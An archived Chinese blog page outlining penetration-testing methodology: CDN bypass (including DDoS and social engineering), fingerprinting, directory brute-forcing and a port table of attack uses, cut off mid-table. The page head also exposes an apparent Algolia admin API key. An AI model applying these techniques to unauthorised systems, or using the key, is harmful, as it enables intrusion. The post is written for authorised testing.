
<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  

  <title>渗透测试流程 | Pa55w0rd &#39;s Blog</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="总结，持续更新   白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!   是要在客户允许的范围内进行测试，白帽子需要有白帽子的底线！   常在河边走很容易就湿鞋，但如果你熟知法律边界，知道有一条不可触碰的高压线摆在那，你就可以做到常在河堤走，永远不湿鞋。-TK教主  0x00 前言渗透测试是指渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对某个特定网络进行测试，">
<meta name="keywords" content="漏洞利用,渗透测试,信息收集,内网渗透">
<meta property="og:type" content="article">
<meta property="og:title" content="渗透测试流程">
<meta property="og:url" content="http://www.pa55w0rd.club/渗透测试/index.html">
<meta property="og:site_name" content="Pa55w0rd &#39;s Blog">
<meta property="og:description" content="总结，持续更新   白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!   是要在客户允许的范围内进行测试，白帽子需要有白帽子的底线！   常在河边走很容易就湿鞋，但如果你熟知法律边界，知道有一条不可触碰的高压线摆在那，你就可以做到常在河堤走，永远不湿鞋。-TK教主  0x00 前言渗透测试是指渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对某个特定网络进行测试，">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2018-12-29T03:53:00.969Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="渗透测试流程">
<meta name="twitter:description" content="总结，持续更新   白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!   是要在客户允许的范围内进行测试，白帽子需要有白帽子的底线！   常在河边走很容易就湿鞋，但如果你熟知法律边界，知道有一条不可触碰的高压线摆在那，你就可以做到常在河堤走，永远不湿鞋。-TK教主  0x00 前言渗透测试是指渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对某个特定网络进行测试，">

  

  


  
    <meta name="baidu-site-verification" content="d4d7b60d81cad7436bcab57af5cf84c7">
  


  
    <meta name="google-site-verification" content="google4b1aaf5aa71b9f3c.html">
  



  
    <link rel="alternative" href="/atom.xml" title="Pa55w0rd &#39;s Blog" type="application/atom+xml">
  


  
    <link rel="icon" href="/img/favicon.ico">
  


  <link rel="stylesheet" href="/css/style.css">
  <!-- <link href="/css/show.ua.css" rel="stylesheet" type="text/css" > -->
  <link href="http://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  <!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.min.js"></script><![endif]-->
  <!-- <link href="/vendors/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" /> -->

  <link href="/vendors/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

  <script src="/js/ua-parser.min.js" type="text/javascript"></script>
  <script src="/js/jquery.js" type="text/javascript"></script>
  <script src="/js/jquery.min.js" type="text/javascript"></script>
  <script src="/js/scrollReveal.js" type="text/javascript"></script>
  <script src="http://cdn.bootcss.com/instantsearch.js/1.5.1/instantsearch.js"></script>
  <script src="/js/algolia-search.js" type="text/javascript"></script>
  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script> -->
  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
  
  
<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-126660308-1', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->







  
  
  <!-- 
  
  
  
  
  
   -->


  <script>
   var CONFIG = {
    root: '/',
    algolia: {
          applicationID: "W1CAX1W2FZ",
          apiKey: "0a71809a146dcea950631aea9ef44f9c",
          adminApiKey: "432573b0a0ab3afd374bd04484251a9b",
          indexName: "Blog",
          hits: {"per_page":10},
          labels: {"input_placeholder":"搜索...","hits_empty":"未发现与 「${query}」相关的内容","hits_stats":"${hits} 条相关条目，使用了 ${time} 毫秒"}
        }
  };
  </script>
<!--
<script>
    (function(){
      if('{{ page.password }}'){
        if (prompt('请输入文章密码') !== '{{ page.password }}'){
          alert('密码错误！');
          history.back();
        }
      }
    })();
  </script>
-->
</head>


</html>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div data-scroll-reveal="enter top" id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Pa55w0rd &#39;s Blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">记录</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/"><i class="fa fa-home" aria-hidden="true"></i>首页</a>
        
          <a class="main-nav-link" href="/archives"><i class="fa fa-archive" aria-hidden="true"></i>归档</a>
        
          <a class="main-nav-link" href="/about"><i class="fa fa-user" aria-hidden="true"></i>关于我</a>
        
          <a class="main-nav-link" href="/comments"><i class="fa fa-comments" aria-hidden="true"></i>留言</a>
        
          <a class="main-nav-link" href="/404.html"><i class="fa fa-heart" aria-hidden="true"></i>公益404</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><i class="fa fa-rss" aria-hidden="true"></i></a>
        
        <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"><i class="fa fa-search" aria-hidden="true"></i></a>
      </nav>
        <div id="local-search-input"></div>
      <!-- 百度搜索 -->
     <!-- <div id="search-form-wrap">
        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="www.pa55w0rd.club">
        </form>
      </div>
      -->
   
    </div>
  </div>
</header>

    <div class="outer">
      <section id="main"><article id="post-渗透测试" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
    <a href="/渗透测试/" class="article-date">
  <i class="fa fa-calendar"></i>
  <time datetime="2018-10-19T03:14:56.000Z" itemprop="datePublished">2018-10-19</time>
</a>

    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web安全/">web安全</a>
  </div>


  </div>
  <div class="article-inner">
    
    

      <header class="article-header">

        
  
    <h1 class="article-title" itemprop="name">
      <i class="fa fa-pencil-square-o  article-title-icon"></i>渗透测试流程
    </h1>
  




        <!-- 目录内容 -->
        
          <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
                <span class="btn-bg"></span>
                <span class="btn-text">文章导航</span>
                </p>
        <div id="toc-article" class="toc-article">
            <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
          <strong class="toc-title">文章目录</strong>
                 <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-明确目标"><span class="toc-number">2.</span> <span class="toc-text">0x01 明确目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-信息收集"><span class="toc-number">3.</span> <span class="toc-text">0x02 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-漏洞发现"><span class="toc-number">4.</span> <span class="toc-text">0x03 漏洞发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-漏洞验证"><span class="toc-number">5.</span> <span class="toc-text">0x04 漏洞验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-后渗透阶段"><span class="toc-number">6.</span> <span class="toc-text">0x05 后渗透阶段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-报告编写"><span class="toc-number">7.</span> <span class="toc-text">0x06 报告编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-风险规避"><span class="toc-number">8.</span> <span class="toc-text">0x07 风险规避</span></a></li></ol>
               </div>
         <script type="text/javascript">
        function showToc(){
          var toc_article = document.getElementById("toc-article");
          var show_toc_btn = document.getElementById("show-toc-btn");
          toc_article.setAttribute("style","display:block");
          show_toc_btn.setAttribute("style","display:none");
          };
        function showBtn(){
          var toc_article = document.getElementById("toc-article");
          var show_toc_btn = document.getElementById("show-toc-btn");
          toc_article.setAttribute("style","display:none");
          show_toc_btn.setAttribute("style","display:block");
          };
         </script>
            		
        <!-- 目录内容结束 -->


      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        
        
          <blockquote>
<p><strong>总结，持续更新</strong></p>
</blockquote>
<blockquote>
<p><strong>白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!</strong></p>
</blockquote>
<blockquote>
<p><strong>是要在客户允许的范围内进行测试，白帽子需要有白帽子的底线！</strong></p>
</blockquote>
<blockquote>
<p><strong>常在河边走很容易就湿鞋，但如果你熟知法律边界，知道有一条不可触碰的高压线摆在那，你就可以做到常在河堤走，永远不湿鞋。-TK教主</strong></p>
</blockquote>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>渗透测试是指渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对某个特定网络进行测试，以期发现和挖掘系统中存在的漏洞，然后输出渗透测试报告，并提交给网络所有者。网络所有者根据渗透人员提供的渗透测试报告，可以清晰知晓系统中存在的安全隐患和问题。<br><br>渗透测试不同于入侵，入侵是不择手段的，甚至是居右破坏性的拿到系统权限<br><a id="more"></a></p>
<h2 id="0x01-明确目标"><a href="#0x01-明确目标" class="headerlink" title="0x01 明确目标"></a>0x01 明确目标</h2><p>当拿到一个合法的渗透测试项目时，我们首先应该明确客户要求我们进行渗透测试的范围以及整体项目的时间。</p>
<ul>
<li>确定范围：测试目标的范围，ip，域名，内外网。</li>
<li>确定规则：能渗透到什么程度，时间？能否修改上传？能否提权？哪些社工手段不能使用等。</li>
<li>确定需求：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？等等。（立体全方位）</li>
</ul>
<p>不会些什么长篇大论，都是CV的，现在在甲方，渗透尽量在不影响业务系统正常运行的前提下进行一次完整的测试，需要全面测试，不能只测出来几个漏洞应付了事了。当然，版本迭代/新业务线啥的一般都是在测试环境上做了，线上的主要看有没有配置问题（服务器/中间件等安全基线这块都没做）</p>
<h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><p>在对一个站进行渗透测试的过程中，信息收集是非常重要的。信息收集的详细与否可能决定着此次渗透测试的结果，知己知彼，百战不殆。</p>
<p>信息搜集分为主动信息搜集和被动信息搜集。</p>
<p>主动信息搜集就是通过直接访问和扫描信息的方式进行收集信息，缺点是会记录自己的操作信息；被动信息搜集就是通过第三方服务进行信息搜集，缺点是收集信息有限。</p>
<ul>
<li><p>真实IP查询</p>
<p>  企业常常为了增强网页访问速度为服务加cdn，CDN的虚假IP干扰了我们的渗透测试，如何判断是否做了cdn<br><br>  可以通过<a href="http://ping.chinaz.com/" target="_blank" rel="noopener">站长工具多地ping服务</a>，或使用nslookup进行检测，如果做了cdn的话域名解析会返回多个IP地址<br><br>  验证ip和域名是否真实对应，修改本地hosts文件，强行将域名与ip解析对应，然后访问域名，查看页面是否变化<br><br>  如何绕过cdn查询真实IP的一些方法：<br></p>
<ol>
<li><strong>ping顶级域名或子域名</strong>，一般企业都只会对www域名做cdn，而常常忽略了空域名和子域名,确定了没有使用CDN的二级域名后，本地将目标域名绑定到同ip，能访问就说明目标站与二级域名在同一服务器，也可能在同C段，扫描C段所有开80端口的ip，挨个尝试</li>
<li><p><strong>查询历史dns记录</strong>,如果存在做了cdn之前的历史记录也是可以查到真实ip的，相关查询网站有：</p>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//dnsdb.io/zh-cn/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//x.threatbook.cn/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//toolbar.netcraft.com/site_report?url=</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//viewdns.info/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//whoisrequest.com/history/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//tools.ipip.net/cdn.php</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//securitytrails.com/</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>DNS社工库 <em>Ps.和查询历史dns记录道理一样，没有相关的裤子</em></p>
</li>
<li>还可以使用对方的邮件服务（如注册激活邮件、找回密码），站点的sendmail功能或者是rss订阅服务，当目标给你发送了一条消息也可以从消息中找到真实ip</li>
<li>利用国外的vps去ping一下域名，大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率直接解析到真实IP。</li>
<li>网站的各种探针类文件，如phpinfo里面的<code>_SERVER[&quot;SERVER_ADDR&quot;]</code>也包含的有服务器端的真实ip，当然这个情况还是比较少的，因为一般都会把phpinfo给删除</li>
<li>如果目标网站有自己的app或软件产品,抓下它的请求,看看能不能这里面找到目标的真实ip</li>
<li>通过各种漏洞或其他方式想办法让目标反向连接我们，比如命令执行反弹shell、ssrf漏洞、xss盲打后台，被动和目标数据库建立连接等等</li>
<li><p>使用<code>nslookup</code>或<code>dig</code>更改dns为国外的不知名的dns服务器来解析目标域名的各种记录（ns、a、mx等）可能查到其真实ip</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">收集的部分国外<span class="selector-tag">dns</span>服务器</span><br><span class="line">209<span class="selector-class">.244</span><span class="selector-class">.0</span><span class="selector-class">.3</span></span><br><span class="line">64<span class="selector-class">.6</span><span class="selector-class">.64</span><span class="selector-class">.6</span></span><br><span class="line">8<span class="selector-class">.8</span><span class="selector-class">.8</span><span class="selector-class">.8</span></span><br><span class="line">9<span class="selector-class">.9</span><span class="selector-class">.9</span><span class="selector-class">.9</span></span><br><span class="line">8<span class="selector-class">.26</span><span class="selector-class">.56</span><span class="selector-class">.26</span></span><br><span class="line">199<span class="selector-class">.85</span><span class="selector-class">.126</span><span class="selector-class">.10</span></span><br><span class="line">208<span class="selector-class">.67</span><span class="selector-class">.222</span><span class="selector-class">.222</span></span><br><span class="line">195<span class="selector-class">.46</span><span class="selector-class">.39</span><span class="selector-class">.39</span></span><br><span class="line">69<span class="selector-class">.195</span><span class="selector-class">.152</span><span class="selector-class">.204</span></span><br><span class="line">208<span class="selector-class">.76</span><span class="selector-class">.50</span><span class="selector-class">.50</span></span><br><span class="line">216<span class="selector-class">.146</span><span class="selector-class">.35</span><span class="selector-class">.35</span></span><br><span class="line">37<span class="selector-class">.235</span><span class="selector-class">.1</span><span class="selector-class">.174</span></span><br><span class="line">198<span class="selector-class">.101</span><span class="selector-class">.242</span><span class="selector-class">.72</span></span><br><span class="line">77<span class="selector-class">.88</span><span class="selector-class">.8</span><span class="selector-class">.8</span></span><br><span class="line">91<span class="selector-class">.239</span><span class="selector-class">.100</span><span class="selector-class">.100</span></span><br><span class="line">74<span class="selector-class">.82</span><span class="selector-class">.42</span><span class="selector-class">.42</span></span><br><span class="line">109<span class="selector-class">.69</span><span class="selector-class">.8</span><span class="selector-class">.51</span></span><br><span class="line">156<span class="selector-class">.154</span><span class="selector-class">.70</span><span class="selector-class">.1</span></span><br><span class="line">1<span class="selector-class">.1</span><span class="selector-class">.1</span><span class="selector-class">.1</span></span><br><span class="line">45<span class="selector-class">.77</span><span class="selector-class">.165</span><span class="selector-class">.194</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>让服务器去访问你的vps，比如说这个网址有设置头像的方式，并且可以直接填写头像的url，或者插入远程图片，那么我们可以把图片放在自己vps上提交给服务器，那么也可以从日志中得到真实ip</p>
</li>
<li>DDOS，耗尽CDN流量，回源之后找到真实ip。不设防的cdn量大就会挂，高防CDN要增大流量 <em>Ps.没有资源，现在防ddos也比较强，没尝试过</em></li>
<li>社工手段，拿到目标网站管理员在cdn的账号，从配置中找到网站的真实IP地址   <em>Ps.沟通障碍</em></li>
<li>全网扫描zmap，使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host字段匹配相关域名 <em>Ps.因造成网络拥堵，后续没有尝试</em></li>
<li>通过shadan/zoomeye/fofa搜索网站特殊标题、内容、网站源码</li>
<li>cloudflare，如<a href="https://github.com/m0rtem/CloudFail" target="_blank" rel="noopener">CloudFail</a>、<a href="http://www.freebuf.com/articles/web/41533.html" target="_blank" rel="noopener">CloudFlare防护下的破绽：寻找真实IP的几条途径</a>、<a href="http://crimeflare.net:83/cfssl.html" target="_blank" rel="noopener">http://crimeflare.net:83/cfssl.html(需要翻墙)</a></li>
</ol>
</li>
</ul>
<ul>
<li><p>whois信息查询</p>
<p>  当拿到一个域名的时候，我们首先应该进行whois查询，可以使kali 下面的 whois命令或者使用<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">chinaz在线工具</a>，whois信息可以获取关键注册人的信息，包括注册公司、注册邮箱、管理员邮箱、管理员联系手机等,对后期社工很有用，还可以查询同一注册人注册的其他的域名，域名对应的NS记录、MX记录，自动识别国内常见的托管商（万网、新网等）。或者我们可以有针对性的利用其信息生成字典，对后台或者其他登录功能进行爆破。</p>
</li>
<li><p>利用搜索引擎发现和侦察信息泄露，如google hacking获得后台，未授权页面，敏感url等</p>
<p>  利用google去搜索包括特殊文本字符串的网页<br>  inurl:xxx filetype:xls<br>  inurl:xxx site:xxx.com</p>
</li>
<li><p>旁站C段查询</p>
<p>  旁站是和目标网站在同一台服务器上的其它的网站；如果从目标站本身找不到好的入手点，这时候，如果想快速拿下目标的话，一般都会先找个目标站点所在服务器上其他的比较好搞的站下手，然后再想办法跨到真正目标的站点目录中。C段是和目标机器ip处在同一个C段的其它机器；通过目标所在C段的其他任一台机器，想办法跨到我们的目标机器上。常用的工具有<a href="http://www.cnblogs.com/dongchi/p/4155368.html" target="_blank" rel="noopener">ip反查</a>，Nmap，Zenmap。</p>
</li>
<li><p>指纹识别</p>
<p>  通过指纹识别，我们可以明确这个网站服务器是用什么操作系统（win/linux）<br></p>
<ul>
<li>TTL</li>
<li>路径大小写</li>
<li>访问不存在的页面<br>针对一个web服务，我们应该首先明确这个是由什么语言开发的前后端，常见脚本语言有php/asp/aspx/jsp等</li>
<li>respone包头</li>
<li>index.php/index.jsp/index.asp</li>
<li><p>爬虫爬取网站结构，看xx.jsp?等</p>
<p>使用的什么webserver版本和类型，因为不同的webserver也有不同的解析漏洞或者其他的漏洞，常见的服务器包括apache/tomcat/iis/nginx。<br></p>
</li>
<li>使用浏览器插件(wappalyzer)可以很方便的查看这些信息<br></li>
<li>使用nc 或telnet 可以观察数据包特征或者网页加载的特殊文件来识别cms，如<code>nc xxx.com 80</code></li>
<li>通过Zoomeye、Shodan等在线系统搜集</li>
<li>利用Nmap(<code>namp -sT -Pn -v &lt;IP&gt;</code>)、MSF、Zmap等端口和指纹识别功能搜集</li>
<li><p>使用burpsuite、Niketo、Whatweb、在线cms指纹识别工具等</p>
<ul>
<li>HTTP 标头 ，如 X-Powered-By 字段</li>
<li>cookie </li>
<li>HTML 源代码</li>
<li>特定文件和文件夹，例如/templets/default/style/dedecms.css — dedecms</li>
<li>网站独有文件的md5，例如favicon.ico</li>
<li>网站命名规则；返回头的关键字；网页关键字；URL特征；Meta特征；Script特征；robots.txt；网站路径特征；网站静态资源；爬取网站目录信息等<br>是否用了某种开源程序cms，然后我们可以利用公开的对应版本的poc、默认的后台登录页/数据库服务端口认证等进行测试，当然我们也可以将对应版本的源码下载下来进行代码审计。<br><br>用什么框架开发的，如Thinkphp、struts2，很多网站都利用开源的框架来快速开发网站，所以收集网站的框架信息也是非常关键的。 <figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">开源的软件</span><br><span class="line"></span><br><span class="line">常见的开源软件有：wordpress、phpbb、dedecms等</span><br><span class="line">开源的框架</span><br><span class="line"></span><br><span class="line">常见的开源框架有：<span class="keyword">Struts2、 </span>Spring MVC、ThinkPHP等</span><br><span class="line">中间件服务器</span><br><span class="line"></span><br><span class="line">常见的中间件服务器有：jboss、tomcat、Weblogic等</span><br><span class="line">数据库服务</span><br><span class="line"></span><br><span class="line">常见的数据库服务：mssql、mysql、oracle、redis、sybase、MongoDB、DB2等</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>是否使用负载均衡，负载均衡是通过在多个服务器中分割WEB流量，来确保单个服务器的请求不会超载，一般不可见，但是有可能极大的改变渗透测试的进程。当发出请求的时候，负载均衡可能将请求交给其中的一个服务器来处理。每个服务器的应用结构虽然相同，但是文件夹不同、补丁级别不同及其他配置可能完全不同</p>
</li>
<li>使用kali下的lbd工具识别</li>
<li><a href="https://github.com//jmbr/halberd" target="_blank" rel="noopener">halberd</a></li>
<li>msf下 <code>auxiliary/gather/f5_bigip_cookie_disclosure</code> 模块</li>
<li>对临近IP段进行扫描</li>
<li>响应时间戳分析：有些服务器没有同步时间，就可以在一秒发出多个请求确定是否有多台服务器</li>
<li>通过比较相同请求资源的首部响应中的ETag和Last-Modified的值，能够确定是否会从多个服务器上的到不同的文件</li>
<li>通过查找cookie：有些服务器会在HTTP会话中加入自己的cookie来指定负载回话</li>
<li>枚举SSL异常：查看SSL证书是否存在差异，是否支持同一个密码长度</li>
<li><p>检查HTML源码中返回的注释</p>
<p>是否存在防护设备</p>
</li>
<li><p>有没有waf，具体是什么类型waf，可以在目标url的动态参数输入一些敏感特征，看是否拦截，也可以用工具判断whatwaf、wafw00f，熟悉各种bypasswaf的骚姿势</p>
</li>
<li>服务器防火墙是否开放，一般都会禁止icmp，通过ping命令探测</li>
</ul>
</li>
</ul>
<ul>
<li><p>历史漏洞收集</p>
<p>  了解目标历史漏洞对我们帮助也是非常的大，至少我们可以知道网站设计人员喜欢在什么地方犯错误，喜欢犯什么类型的错误。这样我们可以有针对性的进行渗透测试，或者说我们可以查看是否已经修补过得漏洞是否能够绕过。exploitdb 、hackerone、CNVD 、乌云漏洞库镜像站。 </p>
</li>
<li><p>利用app进行信息收集</p>
<p>  可以利用工具对其进行逆向，找出其所使用的url链接，然后进行专门的渗透测试</p>
</li>
<li><p>敏感目录/文件</p>
<p>  敏感目录包括但不限于网站的敏感文件（.mdb,.excel,.word,.zip,.rar），各类web入口（后台、控制台弱口令、爆破）、未授权访问的上传页面，文本编辑器、robots.txt、.git文件泄露，.svn文件泄露，.DB_store文件泄露，WEB-INF/web.xml泄露或者phpmyadmin等等目录。<br>就拿备份文件来讲，一般人拿到以后只会查看是否有数据库账号密码进行连接，如果没有就无从下手,其实我们可以通过代码审计发现它的漏洞进行渗透测试。再比如phpmyadmin，我们可以使用爆破工具对其账号密码进行爆破。或者是之前有黑阔留下的后门文件，我们也可以爆破其密码进行利用。<br>目录扫描有两种方式，使用目录字典进行暴力才接存在该目录或文件返回200或者403；使用爬虫爬行主页上的所有链接，对每个链接进行再次爬行，收集这个域名下的所有链接，然后总结出需要的信息。常用工具<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>、御剑、wwwscan、爬虫等发现或爆破发现隐藏页面，增加攻击面</p>
</li>
<li><p>端口信息</p>
<p>  服务和安全是相对应的，每开启一个端口，那么攻击面就大了一点，开启的端口越多，也就意味着服务器面临的威胁越大，如服务配置错误、服务自身漏洞利用、弱口令等。当拿到一个ip的时候，我们一般都需要使用nmap或者其他同类扫描工具如masscan对其开放端口以及端口对应的服务和版本信息进行扫描。通过端口开放情况，我们可以针对性的对其进行渗透测试</p>
<p>  关键的操作就是确定端口后边的软件及软件版本，然后去个漏洞库去查找其存在的漏洞乃至exp<br>  搜索漏洞信息</p>
<ul>
<li><a href="http://www.cvedetails.com/version-search.php" target="_blank" rel="noopener">CVE漏洞库搜索</a></li>
<li><a href="http://cve.mitre.org/cve/search_cve_list.html" target="_blank" rel="noopener">mitre_cve漏洞信息搜索</a><br>通过cve获取exp</li>
<li>通过metasploit搜索<code>msf&gt; search cve:2018-xxxx</code></li>
<li><a href="https://www.exploit-db.com/search/" target="_blank" rel="noopener">exploit-db</a></li>
<li>github搜索</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>端口号</th>
<th>端口服务/协议简要说明</th>
<th>关于端口可能的一些渗透用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>tcp 20,21</td>
<td>ftp 默认的数据和命令传输端口[可明文亦可加密传输]</td>
<td>允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)</td>
</tr>
<tr>
<td>tcp 22</td>
<td>ssh[数据ssl加密传输]</td>
<td>可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输,等等…常用于linux远程管理…</td>
</tr>
<tr>
<td>tcp 23</td>
<td>telnet[明文传输]</td>
<td>爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令,也许会有意想不到的收获</td>
</tr>
<tr>
<td>tcp 25</td>
<td>smtp[简单邮件传输协议,多数linux发行版可能会默认开启此服务]</td>
<td>邮件伪造,vrfy/expn 查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td>
</tr>
<tr>
<td>tcp/udp 53</td>
<td>dns[域名解析]</td>
<td>允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</td>
</tr>
<tr>
<td>tcp/udp 69</td>
<td>tftp[简单文件传输协议,无认证]</td>
<td>尝试下载目标及其的各类重要配置文件</td>
</tr>
<tr>
<td>tcp 80-89,443,8440-8450,8080-8089</td>
<td>web[各种常用的web服务端口]</td>
<td>各种常用web服务端口,可尝试经典的top n,vpn,owa,webmail,目标oa,各类java控制台,各类服务器web管理面板,各类web中间件漏洞利用,各类web框架漏洞利用等等……</td>
</tr>
<tr>
<td>tcp 110</td>
<td>[邮局协议,可明文可密文]</td>
<td>可尝试爆破,嗅探</td>
</tr>
<tr>
<td>tcp 137,139,445</td>
<td>samba[smb实现windows和linux间文件共享,明文]</td>
<td>可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</td>
</tr>
<tr>
<td>tcp 143</td>
<td>imap[可明文可密文]</td>
<td>可尝试爆破</td>
</tr>
<tr>
<td>udp 161</td>
<td>snmp[明文]</td>
<td>爆破默认团队字符串,搜集目标内网信息</td>
</tr>
<tr>
<td>tcp 389</td>
<td>ldap[轻量级目录访问协议]</td>
<td>ldap注入,允许匿名访问,弱口令</td>
</tr>
<tr>
<td>tcp 512,513,514</td>
<td>linux rexec</td>
<td>可爆破,rlogin登陆</td>
</tr>
<tr>
<td>tcp 873</td>
<td>rsync备份服务</td>
<td>匿名访问,文件上传</td>
</tr>
<tr>
<td>tcp 1194</td>
<td>openvpn</td>
<td>想办法钓vpn账号,进内网</td>
</tr>
<tr>
<td>tcp 1352</td>
<td>Lotus domino邮件服务</td>
<td>弱口令,信息泄漏,爆破</td>
</tr>
<tr>
<td>tcp 1433</td>
<td>mssql数据库</td>
<td>注入,提权,sa弱口令,爆破</td>
</tr>
<tr>
<td>tcp 1521</td>
<td>oracle数据库</td>
<td>tns爆破,注入,弹shell…</td>
</tr>
<tr>
<td>tcp 1500</td>
<td>ispmanager主机控制面板</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 1025,111,2049</td>
<td>nfs</td>
<td>权限配置不当</td>
</tr>
<tr>
<td>tcp 1723</td>
<td>pptp</td>
<td>爆破,想办法钓vpn账号,进内网</td>
</tr>
<tr>
<td>tcp 2082,2083</td>
<td>cpanel主机管理面板登录</td>
<td>弱口令</td>
</tr>
<tr>
<td>tcp 2181</td>
<td>zookeeper</td>
<td>未授权访问</td>
</tr>
<tr>
